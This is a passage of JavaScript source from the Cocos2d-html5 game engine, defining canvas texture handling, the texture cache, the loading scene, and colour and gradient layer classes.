    cc.defineGetterSetter(e, "pixelsWidth", e.getPixelsWide),
    cc.defineGetterSetter(e, "pixelsHeight", e.getPixelsHigh),
    cc.defineGetterSetter(e, "width", e._getWidth),
    cc.defineGetterSetter(e, "height", e._getHeight),
    t.defaultPixelFormat = t.PIXEL_FORMAT_DEFAULT
},
cc._tmp.PrototypeTextureAtlas = function() {
    var t = cc.TextureAtlas.prototype;
    cc.defineGetterSetter(t, "totalQuads", t.getTotalQuads),
    cc.defineGetterSetter(t, "capacity", t.getCapacity),
    cc.defineGetterSetter(t, "quads", t.getQuads, t.setQuads)
},
cc.ALIGN_CENTER = 51, cc.ALIGN_TOP = 19, cc.ALIGN_TOP_RIGHT = 18, cc.ALIGN_RIGHT = 50, cc.ALIGN_BOTTOM_RIGHT = 34, cc.ALIGN_BOTTOM = 35, cc.ALIGN_BOTTOM_LEFT = 33, cc.ALIGN_LEFT = 49, cc.ALIGN_TOP_LEFT = 17, cc.PVRHaveAlphaPremultiplied_ = !1, cc._renderType === cc._RENDER_TYPE_CANVAS ? cc.Texture2D = cc.Class.extend({
    _contentSize: null,
    _isLoaded: !1,
    _htmlElementObj: null,
    _loadedEventListeners: null,
    url: null,
    ctor: function() {
        this._contentSize = cc.size(0, 0),
        this._isLoaded = !1,
        this._htmlElementObj = null
    },
    getPixelsWide: function() {
        return this._contentSize.width
    },
    getPixelsHigh: function() {
        return this._contentSize.height
    },
    getContentSize: function() {
        var t = cc.contentScaleFactor();
        return cc.size(this._contentSize.width / t, this._contentSize.height / t)
    },
    _getWidth: function() {
        return this._contentSize.width / cc.contentScaleFactor()
    },
    _getHeight: function() {
        return this._contentSize.height / cc.contentScaleFactor()
    },
    getContentSizeInPixels: function() {
        return this._contentSize
    },
    initWithElement: function(t) {
        t && (this._htmlElementObj = t)
    },
    getHtmlElementObj: function() {
        return this._htmlElementObj
    },
    isLoaded: function() {
        return this._isLoaded
    },
    handleLoadedTexture: function() {
        if (!this._isLoaded) {
            if (!this._htmlElementObj) {
                var t = cc.loader.getRes(this.url);
                if (!t) return;
                this.initWithElement(t)
            }
            this._isLoaded = !0,
            t = this._htmlElementObj,
            this._contentSize.width = t.width,
            this._contentSize.height = t.height,
            this._callLoadedEventCallbacks()
        }
    },
    description: function() {
        return "<cc.Texture2D | width = " + this._contentSize.width + " height " + this._contentSize.height + ">"
    },
    initWithData: function() {
        return ! 1
    },
    initWithImage: function() {
        return ! 1
    },
    initWithString: function() {
        return ! 1
    },
    releaseTexture: function() {},
    getName: function() {
        return null
    },
    getMaxS: function() {
        return 1
    },
    setMaxS: function() {},
    getMaxT: function() {
        return 1
    },
    setMaxT: function() {},
    getPixelFormat: function() {
        return null
    },
    getShaderProgram: function() {
        return null
    },
    setShaderProgram: function() {},
    hasPremultipliedAlpha: function() {
        return ! 1
    },
    hasMipmaps: function() {
        return ! 1
    },
    releaseData: function() {},
    keepData: function(t) {
        return t
    },
    drawAtPoint: function() {},
    drawInRect: function() {},
    initWithETCFile: function() {
        return cc.log(cc._LogInfos.Texture2D_initWithETCFile),
        !1
    },
    initWithPVRFile: function() {
        return cc.log(cc._LogInfos.Texture2D_initWithPVRFile),
        !1
    },
    initWithPVRTCData: function() {
        return cc.log(cc._LogInfos.Texture2D_initWithPVRTCData),
        !1
    },
    setTexParameters: function() {},
    setAntiAliasTexParameters: function() {},
    setAliasTexParameters: function() {},
    generateMipmap: function() {},
    stringForFormat: function() {
        return ""
    },
    bitsPerPixelForFormat: function() {
        return - 1
    },
    addLoadedEventListener: function(t, e) {
        this._loadedEventListeners || (this._loadedEventListeners = []),
        this._loadedEventListeners.push({
            eventCallback: t,
            eventTarget: e
        })
    },
    removeLoadedEventListener: function(t) {
        if (this._loadedEventListeners) for (var e = this._loadedEventListeners,
        i = 0; i < e.length; i++) e[i].eventTarget == t && e.splice(i, 1)
    },
    _callLoadedEventCallbacks: function() {
        if (this._loadedEventListeners) {
            for (var t = this._loadedEventListeners,
            e = 0,
            i = t.length; i > e; e++) {
                var n = t[e];
                n.eventCallback.call(n.eventTarget, this)
            }
            t.length = 0
        }
    }
}) : (cc.assert("function" == typeof cc._tmp.WebGLTexture2D, cc._LogInfos.MissingFile, "TexturesWebGL.js"), cc._tmp.WebGLTexture2D(), delete cc._tmp.WebGLTexture2D), cc.assert("function" == typeof cc._tmp.PrototypeTexture2D, cc._LogInfos.MissingFile, "TexturesPropertyDefine.js"), cc._tmp.PrototypeTexture2D(), delete cc._tmp.PrototypeTexture2D, cc.textureCache = {
    _textures: {},
    _textureColorsCache: {},
    _textureKeySeq: 0 | 1e3 * Math.random(),
    _loadedTexturesBefore: {},
    _initializingRenderer: function() {
        var t, e = this._loadedTexturesBefore,
        i = this._textures;
        for (t in e) {
            var n = e[t];
            n.handleLoadedTexture(),
            i[t] = n
        }
        this._loadedTexturesBefore = {}
    },
    addPVRTCImage: function() {
        cc.log(cc._LogInfos.textureCache_addPVRTCImage)
    },
    addETCImage: function() {
        cc.log(cc._LogInfos.textureCache_addETCImage)
    },
    description: function() {
        return "<TextureCache | Number of textures = " + this._textures.length + ">"
    },
    textureForKey: function(t) {
        return this._textures[t] || this._textures[cc.loader._aliases[t]]
    },
    getKeyByTexture: function(t) {
        for (var e in this._textures) if (this._textures[e] == t) return e;
        return null
    },
    _generalTextureKey: function() {
        return this._textureKeySeq++,
        "_textureKey_" + this._textureKeySeq
    },
    getTextureColors: function(t) {
        var e = this.getKeyByTexture(t);
        return e || (e = t instanceof HTMLImageElement ? t.src: this._generalTextureKey()),
        this._textureColorsCache[e] || (this._textureColorsCache[e] = cc.generateTextureCacheForColor(t)),
        this._textureColorsCache[e]
    },
    addPVRImage: function() {
        cc.log(cc._LogInfos.textureCache_addPVRImage)
    },
    removeAllTextures: function() {
        var t, e = this._textures;
        for (t in e) e[t] && e[t].releaseTexture();
        this._textures = {}
    },
    removeTexture: function(t) {
        if (t) {
            var e, i = this._textures;
            for (e in i) i[e] == t && (i[e].releaseTexture(), delete i[e])
        }
    },
    removeTextureForKey: function(t) {
        null != t && this._textures[t] && delete this._textures[t]
    },
    cacheImage: function(t, e) {
        if (e instanceof cc.Texture2D) this._textures[t] = e;
        else {
            var i = new cc.Texture2D;
            i.initWithElement(e),
            i.handleLoadedTexture(),
            this._textures[t] = i
        }
    },
    addUIImage: function(t, e) {
        if (cc.assert(t, cc._LogInfos.textureCache_addUIImage_2), e && this._textures[e]) return this._textures[e];
        var i = new cc.Texture2D;
        return i.initWithImage(t),
        null != e && null != i ? this._textures[e] = i: cc.log(cc._LogInfos.textureCache_addUIImage),
        i
    },
    dumpCachedTextureInfo: function() {
        var t, e = 0,
        i = 0,
        n = this._textures;
        for (t in n) {
            var r = n[t];
            e++,
            r.getHtmlElementObj() instanceof HTMLImageElement ? cc.log(cc._LogInfos.textureCache_dumpCachedTextureInfo, t, r.getHtmlElementObj().src, r.pixelsWidth, r.pixelsHeight) : cc.log(cc._LogInfos.textureCache_dumpCachedTextureInfo_2, t, r.pixelsWidth, r.pixelsHeight),
            i += 4 * r.pixelsWidth * r.pixelsHeight
        }
        n = this._textureColorsCache;
        for (t in n) {
            var c, r = n[t];
            for (c in r) {
                var o = r[c];
                e++,
                cc.log(cc._LogInfos.textureCache_dumpCachedTextureInfo_2, t, o.width, o.height),
                i += 4 * o.width * o.height
            }
        }
        cc.log(cc._LogInfos.textureCache_dumpCachedTextureInfo_3, e, i / 1024, (i / 1048576).toFixed(2))
    },
    _clear: function() {
        this._textures = {},
        this._textureColorsCache = {},
        this._textureKeySeq = 0 | 1e3 * Math.random(),
        this._loadedTexturesBefore = {}
    }
},
cc._renderType === cc._RENDER_TYPE_CANVAS ? (_p = cc.textureCache, _p.handleLoadedTexture = function(t) {
    var e = this._textures,
    i = e[t];
    i || (i = e[t] = new cc.Texture2D, i.url = t),
    i.handleLoadedTexture()
},
_p.addImage = function(t, e, i) {
    cc.assert(t, cc._LogInfos.Texture2D_addImage);
    var n = this._textures,
    r = n[t] || n[cc.loader._aliases[t]];
    return r ? (e && e.call(i), r) : (r = n[t] = new cc.Texture2D, r.url = t, cc.loader.getRes(t) ? r.handleLoadedTexture() : cc.loader._checkIsImageURL(t) ? cc.loader.load(t,
    function() {
        e && e.call(i)
    }) : cc.loader.cache[t] = cc.loader.loadImg(t,
    function(i, n) {
        return i ? e ? e(i) : i: (cc.textureCache.handleLoadedTexture(t), void(e && e(null, n)))
    }), r)
},
_p = null) : (cc.assert("function" == typeof cc._tmp.WebGLTextureCache, cc._LogInfos.MissingFile, "TexturesWebGL.js"), cc._tmp.WebGLTextureCache(), delete cc._tmp.WebGLTextureCache), cc.Scene = cc.Node.extend({
    _className: "Scene",
    ctor: function() {
        cc.Node.prototype.ctor.call(this),
        this._ignoreAnchorPointForPosition = !0,
        this.setAnchorPoint(.5, .5),
        this.setContentSize(cc.director.getWinSize())
    }
}), cc.Scene.create = function() {
    return new cc.Scene
},
cc.LoaderScene = cc.Scene.extend({
    _interval: null,
    _length: 0,
    _count: 0,
    _label: null,
    _className: "LoaderScene",
    init: function() {
        var t = this,
        e = 200,
        i = t._bgLayer = cc.LayerColor.create(cc.color(32, 32, 32, 255));
        i.setPosition(cc.visibleRect.bottomLeft),
        t.addChild(i, 0);
        var n = 24,
        r = -e / 2 + 100;
        return cc._loaderImage && (cc.loader.loadImg(cc._loaderImage, {
            isCrossOrigin: !1
        },
        function(i, n) {
            e = n.height,
            t._initStage(n, cc.visibleRect.center)
        }), n = 14, r = -e / 2 - 10),
        n = t._label = cc.LabelTTF.create("Loading... 0%", "Arial", n),
        n.setPosition(cc.pAdd(cc.visibleRect.center, cc.p(0, r))),
        n.setColor(cc.color(180, 180, 180)),
        i.addChild(this._label, 10),
        !0
    },
    _initStage: function(t, e) {
        var i = this._texture2d = new cc.Texture2D;
        i.initWithElement(t),
        i.handleLoadedTexture(),
        i = this._logo = cc.Sprite.create(i),
        i.setScale(cc.contentScaleFactor()),
        i.x = e.x,
        i.y = e.y,
        this._bgLayer.addChild(i, 10)
    },
    onEnter: function() {
        cc.Node.prototype.onEnter.call(this),
        this.schedule(this._startLoading, .3)
    },
    onExit: function() {
        cc.Node.prototype.onExit.call(this),
        this._label.setString("Loading... 0%")
    },
    initWithResources: function(t, e) {
        "string" == typeof t && (t = [t]),
        this.resources = t || [],
        this.cb = e
    },
    _startLoading: function() {
        var t = this;
        t.unschedule(t._startLoading);
        var e = t.resources;
        t._length = e.length,
        t._count = 0,
        cc.loader.load(e,
        function(e, i) {
            t._count = i
        },
        function() {
            t.cb && t.cb()
        }),
        t.schedule(t._updatePercent)
    },
    _updatePercent: function() {
        var t, e = this._count,
        i = this._length;
        t = Math.min(100 * (e / i) | 0, 100),
        this._label.setString("Loading... " + t + "%"),
        e >= i && this.unschedule(this._updatePercent)
    }
}), cc.LoaderScene.preload = function(t, e) {
    var i = cc;
    return i.loaderScene || (i.loaderScene = new cc.LoaderScene, i.loaderScene.init()),
    i.loaderScene.initWithResources(t, e),
    cc.director.runScene(i.loaderScene),
    i.loaderScene
},
cc._tmp.PrototypeLayerRGBA = function() {
    var t = cc.LayerRGBA.prototype;
    cc.defineGetterSetter(t, "opacityModifyRGB", t.isOpacityModifyRGB, t.setOpacityModifyRGB),
    cc.defineGetterSetter(t, "opacity", t.getOpacity, t.setOpacity),
    cc.defineGetterSetter(t, "cascadeOpacity", t.isCascadeOpacityEnabled, t.setCascadeOpacityEnabled),
    cc.defineGetterSetter(t, "color", t.getColor, t.setColor),
    cc.defineGetterSetter(t, "cascadeColor", t.isCascadeColorEnabled, t.setCascadeColorEnabled)
},
cc._tmp.PrototypeLayerColor = function() {
    var t = cc.LayerColor.prototype;
    cc.defineGetterSetter(t, "width", t._getWidth, t._setWidth),
    cc.defineGetterSetter(t, "height", t._getHeight, t._setHeight)
},
cc._tmp.PrototypeLayerGradient = function() {
    var t = cc.LayerGradient.prototype;
    cc.defineGetterSetter(t, "startColor", t.getStartColor, t.setStartColor),
    cc.defineGetterSetter(t, "endColor", t.getEndColor, t.setEndColor),
    cc.defineGetterSetter(t, "startOpacity", t.getStartOpacity, t.setStartOpacity),
    cc.defineGetterSetter(t, "endOpacity", t.getEndOpacity, t.setEndOpacity),
    cc.defineGetterSetter(t, "vector", t.getVector, t.setVector)
},
cc.Layer = cc.Node.extend({
    _isBaked: !1,
    _bakeSprite: null,
    _className: "Layer",
    ctor: function() {
        var t = cc.Node.prototype;
        t.ctor.call(this),
        this._ignoreAnchorPointForPosition = !0,
        t.setAnchorPoint.call(this, .5, .5),
        t.setContentSize.call(this, cc.winSize)
    },
    bake: null,
    unbake: null,
    isBaked: function() {
        return this._isBaked
    },
    visit: null
}), cc.Layer.create = function() {
    return new cc.Layer
},
cc._renderType === cc._RENDER_TYPE_CANVAS) {
    var p = cc.Layer.prototype;
    p.bake = function() {
        if (!this._isBaked) {
            this._isBaked = this._cacheDirty = !0,
            this._cachedParent = this;
            for (var t = this._children,
            e = 0,
            i = t.length; i > e; e++) t[e]._setCachedParent(this);
            this._bakeSprite || (this._bakeSprite = new cc.BakeSprite)
        }
    },
    p.unbake = function() {
        if (this._isBaked) {
            this._isBaked = !1,
            this._cacheDirty = !0,
            this._cachedParent = null;
            for (var t = this._children,
            e = 0,
            i = t.length; i > e; e++) t[e]._setCachedParent(null)
        }
    },
    p.visit = function(t) {
        if (this._isBaked) {
            t = t || cc._renderContext;
            var e, i = this._children,
            n = i.length;
            if (this._visible && 0 !== n) {
                var r = this._bakeSprite;
                if (t.save(), this.transform(t), this._cacheDirty) {
                    e = this._getBoundingBoxForBake(),
                    e.width |= 0,
                    e.height |= 0;
                    var c = r.getCacheContext();
                    r.resetCanvasSize(e.width, e.height),
                    c.translate(0 - e.x, e.height + e.y);
                    var o = r.getAnchorPointInPoints();
                    for (r.setPosition(o.x + e.x, o.y + e.y), this.sortAllChildren(), e = 0; n > e; e++) i[e].visit(c);
                    this._cacheDirty = !1
                }
                r.visit(t),
                this.arrivalOrder = 0,
                t.restore()
            }
        } else cc.Node.prototype.visit.call(this, t)
    },
    p._getBoundingBoxForBake = function() {
        var t = null;
        if (!this._children || 0 === this._children.length) return cc.rect(0, 0, 10, 10);
        for (var e = this._children,
        i = 0; i < e.length; i++) {
            var n = e[i];
            n && n._visible && (t ? (n = n._getBoundingBoxToCurrentNode()) && (t = cc.rectUnion(t, n)) : t = n._getBoundingBoxToCurrentNode())
        }
        return t
    },
    p = null
} else cc.assert("function" == typeof cc._tmp.LayerDefineForWebGL, cc._LogInfos.MissingFile, "CCLayerWebGL.js"),
cc._tmp.LayerDefineForWebGL(),
delete cc._tmp.LayerDefineForWebGL;
cc.LayerRGBA = cc.Layer.extend({
    RGBAProtocol: !0,
    _displayedOpacity: 255,
    _realOpacity: 255,
    _displayedColor: null,
    _realColor: null,
    _cascadeOpacityEnabled: !1,
    _cascadeColorEnabled: !1,
    _className: "LayerRGBA",
    ctor: function() {
        cc.Layer.prototype.ctor.call(this),
        this._displayedColor = cc.color(255, 255, 255, 255),
        this._realColor = cc.color(255, 255, 255, 255)
    },
    init: function() {
        var t = cc.Layer.prototype;
        return this._ignoreAnchorPointForPosition = !0,
        t.setAnchorPoint.call(this, .5, .5),
        t.setContentSize.call(this, cc.winSize),
        this.cascadeColor = this.cascadeOpacity = !1,
        !0
    },
    getOpacity: function() {
        return this._realOpacity
    },
    getDisplayedOpacity: function() {
        return this._displayedOpacity
    },
    setOpacity: function(t) {
        this._displayedOpacity = this._realOpacity = t;
        var e = 255,
        i = this._parent;
        i && i.RGBAProtocol && i.cascadeOpacity && (e = i.getDisplayedOpacity()),
        this.updateDisplayedOpacity(e),
        this._displayedColor.a = this._realColor.a = t
    },
    updateDisplayedOpacity: function(t) {
        if (this._displayedOpacity = 0 | this._realOpacity * t / 255, this._cascadeOpacityEnabled) {
            t = this._children;
            for (var e, i = 0; i < t.length; i++)(e = t[i]) && e.RGBAProtocol && e.updateDisplayedOpacity(this._displayedOpacity)
        }
    },
    isCascadeOpacityEnabled: function() {
        return this._cascadeOpacityEnabled
    },
    setCascadeOpacityEnabled: function(t) {
        this._cascadeOpacityEnabled !== t && ((this._cascadeOpacityEnabled = t) ? this._enableCascadeOpacity() : this._disableCascadeOpacity())
    },
    _enableCascadeOpacity: function() {
        var t = 255,
        e = this._parent;
        e && e.RGBAProtocol && e.cascadeOpacity && (t = e.getDisplayedOpacity()),
        this.updateDisplayedOpacity(t)
    },
    _disableCascadeOpacity: function() {
        this._displayedOpacity = this._realOpacity;
        for (var t, e = this._children,
        i = 0; i < e.length; i++)(t = e[i]) && t.RGBAProtocol && t.updateDisplayedOpacity(255)
    },
    getColor: function() {
        var t = this._realColor;
        return cc.color(t.r, t.g, t.b, t.a)
    },
    getDisplayedColor: function() {
        var t = this._displayedColor;
        return cc.color(t.r, t.g, t.b)
    },
    setColor: function(t) {
        var e = this._displayedColor,
        i = this._realColor;
        e.r = i.r = t.r,
        e.g = i.g = t.g,
        e.b = i.b = t.b,
        e = (e = this._parent) && e.RGBAProtocol && e.cascadeColor ? e.getDisplayedColor() : cc.color.WHITE,
        this.updateDisplayedColor(e),
        void 0 !== t.a && !t.a_undefined && this.setOpacity(t.a)
    },
    updateDisplayedColor: function(t) {
        var e = this._displayedColor,
        i = this._realColor;
        if (e.r = 0 | i.r * t.r / 255, e.g = 0 | i.g * t.g / 255, e.b = 0 | i.b * t.b / 255, this._cascadeColorEnabled) {
            t = this._children;
            for (var n = 0; n < t.length; n++)(i = t[n]) && i.RGBAProtocol && i.updateDisplayedColor(e)
        }
    },
    isCascadeColorEnabled: function() {
        return this._cascadeColorEnabled
    },
    setCascadeColorEnabled: function(t) {
        this._cascadeColorEnabled !== t && ((this._cascadeColorEnabled = t) ? this._enableCascadeColor() : this._disableCascadeColor())
    },
    _enableCascadeColor: function() {
        var t;
        t = (t = this._parent) && t.RGBAProtocol && t.cascadeColor ? t.getDisplayedColor() : cc.color.WHITE,
        this.updateDisplayedColor(t)
    },
    _disableCascadeColor: function() {
        var t = this._displayedColor,
        e = this._realColor;
        t.r = e.r,
        t.g = e.g,
        t.b = e.b;
        var i, n, t = this._children,
        e = cc.color.WHITE;
        for (n = 0; n < t.length; n++)(i = t[n]) && i.RGBAProtocol && i.updateDisplayedColor(e)
    },
    addChild: function(t, e, i) {
        cc.Node.prototype.addChild.call(this, t, e, i),
        this._cascadeColorEnabled && this._enableCascadeColor(),
        this._cascadeOpacityEnabled && this._enableCascadeOpacity()
    },
    setOpacityModifyRGB: function() {},
    isOpacityModifyRGB: function() {
        return ! 1
    }
}),
cc.assert("function" == typeof cc._tmp.PrototypeLayerRGBA, cc._LogInfos.MissingFile, "CCLayerPropertyDefine.js"),
cc._tmp.PrototypeLayerRGBA(),
delete cc._tmp.PrototypeLayerRGBA,
cc.LayerColor = cc.LayerRGBA.extend({
    _blendFunc: null,
    _className: "LayerColor",
    getBlendFunc: function() {
        return this._blendFunc
    },
    changeWidthAndHeight: function(t, e) {
        this.width = t,
        this.height = e
    },
    changeWidth: function(t) {
        this.width = t
    },
    changeHeight: function(t) {
        this.height = t
    },
    setOpacityModifyRGB: function() {},
    isOpacityModifyRGB: function() {
        return ! 1
    },
    setColor: function(t) {
        cc.LayerRGBA.prototype.setColor.call(this, t),
        this._updateColor()
    },
    setOpacity: function(t) {
        cc.LayerRGBA.prototype.setOpacity.call(this, t),
        this._updateColor()
    },
    _isLighterMode: !1,
    ctor: null,
    init: function(t, e, i) {
        cc._renderType !== cc._RENDER_TYPE_CANVAS && (this.shaderProgram = cc.shaderCache.programForKey(cc.SHADER_POSITION_COLOR));
        var n = cc.director.getWinSize();
        return t = t || cc.color(0, 0, 0, 255),
        e = void 0 === e ? n.width: e,
        i = void 0 === i ? n.height: i,
        n = this._displayedColor,
        n.r = t.r,
        n.g = t.g,
        n.b = t.b,
        n = this._realColor,
        n.r = t.r,
        n.g = t.g,
        n.b = t.b,
        this._realOpacity = this._displayedOpacity = t.a,
        t = cc.LayerColor.prototype,
        t.setContentSize.call(this, e, i),
        t._updateColor.call(this),
        !0
    },
    setBlendFunc: function(t, e) {
        this._blendFunc = void 0 === e ? t: {
            src: t,
            dst: e
        },
        cc._renderType === cc._RENDER_TYPE_CANVAS && (this._isLighterMode = this._blendFunc && 1 == this._blendFunc.src && 771 == this._blendFunc.dst)
    },
    _setWidth: null,
    _setHeight: null,
    _updateColor: null,
    updateDisplayedColor: function(t) {
        cc.LayerRGBA.prototype.updateDisplayedColor.call(this, t),
        this._updateColor()
    },
    updateDisplayedOpacity: function(t) {
        cc.LayerRGBA.prototype.updateDisplayedOpacity.call(this, t),
        this._updateColor()
    },
    draw: null
}),
cc.LayerColor.create = function(t, e, i) {
    return new cc.LayerColor(t, e, i)
},
cc._renderType === cc._RENDER_TYPE_CANVAS ? (_p = cc.LayerColor.prototype, _p.ctor = function(t, e, i) {
    cc.LayerRGBA.prototype.ctor.call(this),
    this._blendFunc = new cc.BlendFunc(cc.BLEND_SRC, cc.BLEND_DST),
    cc.LayerColor.prototype.init.call(this, t, e, i)
},
_p._setWidth = cc.LayerRGBA.prototype._setWidth, _p._setHeight = cc.LayerRGBA.prototype._setHeight, _p._updateColor = function() {},
_p.draw = function(t) {
    t = t || cc._renderContext;
    var e = cc.view,
    i = this._displayedColor;
    t.fillStyle = "rgba(" + (0 | i.r) + "," + (0 | i.g) + "," + (0 | i.b) + "," + this._displayedOpacity / 255 + ")",
    t.fillRect(0, 0, this.width * e.getScaleX(), -this.height * e.getScaleY()),
    cc.g_NumberOfDraws++
},
_p.visit = function(t) {
    if (this._isBaked) {
        t = t || cc._renderContext;
        var e, i = this._children,
        n = i.length;
        if (this._visible) {
            var r = this._bakeSprite;
            if (t.save(), this.transform(t), this._cacheDirty) {
                e = this._getBoundingBoxForBake(),
                e.width |= 0,
                e.height |= 0;
                var c = r.getCacheContext();
                r.resetCanvasSize(e.width, e.height);
                var o = r.getAnchorPointInPoints(),
                s = this._position;
                if (this._ignoreAnchorPointForPosition) c.translate(0 - e.x + s.x, e.height + e.y - s.y),
                r.setPosition(o.x + e.x - s.x, o.y + e.y - s.y);
                else {
                    var a = this.getAnchorPointInPoints(),
                    h = s.x - a.x,
                    s = s.y - a.y;
                    c.translate(0 - e.x + h, e.height + e.y - s),
                    r.setPosition(o.x + e.x - h, o.y + e.y - s)
                }
                if (n > 0) {
                    for (this.sortAllChildren(), e = 0; n > e && (o = i[e], 0 > o._localZOrder); e++) o.visit(c);
                    for (this.draw(c); n > e; e++) i[e].visit(c)
                } else this.draw(c);
                this._cacheDirty = !1
            }
            r.visit(t),
            this.arrivalOrder = 0,
            t.restore()
        }
    } else cc.Node.prototype.visit.call(this, t)
},
_p._getBoundingBoxForBake = function() {
    var t = cc.rect(0, 0, this._contentSize.width, this._contentSize.height),
    e = this.nodeToWorldTransform(),
    t = cc.RectApplyAffineTransform(t, this.nodeToWorldTransform());
    if (!this._children || 0 === this._children.length) return t;
    for (var i = this._children,
    n = 0; n < i.length; n++) {
        var r = i[n];
        r && r._visible && (r = r._getBoundingBoxToCurrentNode(e), t = cc.rectUnion(t, r))
    }
    return t
},
_p = null) : (cc.assert("function" == typeof cc._tmp.WebGLLayerColor, cc._LogInfos.MissingFile, "CCLayerWebGL.js"), cc._tmp.WebGLLayerColor(), delete cc._tmp.WebGLLayerColor),
cc.assert("function" == typeof cc._tmp.PrototypeLayerColor, cc._LogInfos.MissingFile, "CCLayerPropertyDefine.js"),
cc._tmp.PrototypeLayerColor(),
delete cc._tmp.PrototypeLayerColor,
cc.LayerGradient = cc.LayerColor.extend({
    _startColor: null,
    _endColor: null,
    _startOpacity: 255,
    _endOpacity: 255,
    _alongVector: null,
    _compressedInterpolation: !1,
    _gradientStartPoint: null,
    _gradientEndPoint: null,
    _className: "LayerGradient",
    ctor: function(t, e, i) {
        cc.LayerColor.prototype.ctor.call(this),
        this._startColor = cc.color(0, 0, 0, 255),
        this._endColor = cc.color(0, 0, 0, 255),
        this._alongVector = cc.p(0, -1),
        this._endOpacity = this._startOpacity = 255,
        this._gradientStartPoint = cc.p(0, 0),
        this._gradientEndPoint = cc.p(0, 0),
        cc.LayerGradient.prototype.init.call(this, t, e, i)
    },
    init: function(t, e, i) {
        t = t || cc.color(0, 0, 0, 255),
        e = e || cc.color(0, 0, 0, 255),
        i = i || cc.p(0, -1);
        var n = this._startColor,
        r = this._endColor;
        return n.r = t.r,
        n.g = t.g,
        n.b = t.b,
        this._startOpacity = t.a,
        r.r = e.r,
        r.g = e.g,
        r.b = e.b,
        this._endOpacity = e.a,
        this._alongVector = i,
        this._compressedInterpolation = !0,
        this._gradientStartPoint = cc.p(0, 0),
        this._gradientEndPoint = cc.p(0, 0),
        cc.LayerColor.prototype.init.call(this, cc.color(t.r, t.g, t.b, 255)),
        cc.LayerGradient.prototype._updateColor.call(this),
        !0
    },
    setContentSize: function(t, e) {
        cc.LayerColor.prototype.setContentSize.call(this, t, e),
        this._updateColor()
    },
    _setWidth: function(t) {
        cc.LayerColor.prototype._setWidth.call(this, t),
        this._updateColor()
    },
    _setHeight: function(t) {
        cc.LayerColor.prototype._setHeight.call(this, t),
        this._updateColor()
    },
    getStartColor: function() {
        return this._realColor
    },
    setStartColor: function(t) {
        this.color = t
    },
    setEndColor: function(t) {
        this._endColor = t,
        this._updateColor()
    },
    getEndColor: function() {
        return this._endColor
    },
    setStartOpacity: function(t) {
        this._startOpacity = t,
        this._updateColor()
    },
    getStartOpacity: function() {
        return this._startOpacity
    },
    setEndOpacity: function(t) {
        this._endOpacity = t,
        this._updateColor()
    },
    getEndOpacity: function() {
        return this._endOpacity
    },
    setVector: function(t) {
        this._alongVector.x = t.x,
        this._alongVector.y = t.y,
        this._updateColor()
    },
    getVector: function() {
        return cc.p(this._alongVector.x, this._alongVector.y)
    },
    isCompressedInterpolation: function() {
        return this._compressedInterpolation
    },
    setCompressedInterpolation: function(t) {
        this._compressedInterpolation = t,
        this._updateColor()
    },
    _draw: null,
    _updateColor: null
}),
cc.LayerGradient.create = function(t, e, i) {
    return new cc.LayerGradient(t, e, i)
},
cc._renderType === cc._RENDER_TYPE_CANVAS ? (_p = cc.LayerGradient.prototype, _p.draw = function(t) {
    t = t || cc._renderContext,
    this._isLighterMode && (t.globalCompositeOperation = "lighter"),
    t.save();
    var e = cc.view,
    i = this._displayedOpacity / 255,
    n = this.width * e.getScaleX(),
    e = this.height * e.getScaleY(),
    r = t.createLinearGradient(this._gradientStartPoint.x, this._gradientStartPoint.y, this._gradientEndPoint.x, this._gradientEndPoint.y),
    c = this._displayedColor,
    o = this._endColor;
    r.addColorStop(0, "rgba(" + Math.round(c.r) + "," + Math.round(c.g) + "," + Math.round(c.b) + "," + (i * (this._startOpacity / 255)).toFixed(4) + ")"),
    r.addColorStop(1, "rgba(" + Math.round(o.r) + "," + Math.round(o.g) + "," + Math.round(o.b) + "," + (i * (this._endOpacity / 255)).toFixed(4) + ")"),
    t.fillStyle = r,
    t.fillRect(0, 0, n, -e),
    0 != this._rotation && t.rotate(this._rotationRadians),
    t.restore()
},
_p._updateColor = function() {
    var t = this._alongVector,
    e = .5 * this.width,
    i = .5 * this.height;
    this._gradientStartPoint.x = e * -t.x + e,
    this._gradientStartPoint.y = i * t.y - i,
    this._gradientEndPoint.x = e * t.x + e,
    this._gradientEndPoint.y = i * -t.y - i
},
_p = null) : (cc.assert("function" == typeof cc._tmp.WebGLLayerGradient, cc._LogInfos.MissingFile, "CCLayerWebGL.js"), cc._tmp.WebGLLayerGradient(), delete cc._tmp.WebGLLayerGradient),
cc.assert("function" == typeof cc._tmp.PrototypeLayerGradient, cc._LogInfos.MissingFile, "CCLayerPropertyDefine.js"),
cc._tmp.PrototypeLayerGradient(),
delete cc._tmp.PrototypeLayerGradient,
cc.LayerMultiplex = cc.Layer.extend({
    _enabledLayer: 0,
    _layers: null,
    _className: "LayerMultiplex",
    ctor: function(t) {
        cc.Layer.prototype.ctor.call(this),
        t && cc.LayerMultiplex.prototype.initWithLayers.call(this, t)
    },
    initWithLayers: function(t) {
        return 0 < t.length && null == t[t.length - 1] && cc.log(cc._LogInfos.LayerMultiplex_initWithLayers),
        this._layers = t,
        this._enabledLayer = 0,
        this.addChild(this._layers[this._enabledLayer]),
        !0
    },
    switchTo: function(t) {
        t >= this._layers.length ? cc.log(cc._LogInfos.LayerMultiplex_switchTo) : (this.removeChild(this._layers[this._enabledLayer], !0), this._enabledLayer = t, this.addChild(this._layers[t]))
    },
    switchToAndReleaseMe: function(t) {
        t >= this._layers.length ? cc.log(cc._LogInfos.LayerMultiplex_switchToAndReleaseMe) : (this.removeChild(this._layers[this._enabledLayer], !0), this._layers[this._enabledLayer] = null, this._enabledLayer = t, this.addChild(this._layers[t]))
    },
    addLayer: function(t) {
        t ? this._layers.push(t) : cc.log(cc._LogInfos.LayerMultiplex_addLayer)
    }
}),
cc.LayerMultiplex.create = function() {
    return new cc.LayerMultiplex(arguments)
},
cc._tmp.PrototypeSprite = function() {
    var t = cc.Sprite.prototype;
    cc.defineGetterSetter(t, "opacityModifyRGB", t.isOpacityModifyRGB, t.setOpacityModifyRGB),
    cc.defineGetterSetter(t, "opacity", t.getOpacity, t.setOpacity),
    cc.defineGetterSetter(t, "color", t.getColor, t.setColor),
    cc.defineGetterSetter(t, "flippedX", t.isFlippedX, t.setFlippedX),
    cc.defineGetterSetter(t, "flippedY", t.isFlippedY, t.setFlippedY),
    cc.defineGetterSetter(t, "offsetX", t._getOffsetX),
    cc.defineGetterSetter(t, "offsetY", t._getOffsetY),
    cc.defineGetterSetter(t, "texture", t.getTexture, t.setTexture),
    cc.defineGetterSetter(t, "textureRectRotated", t.isTextureRectRotated),
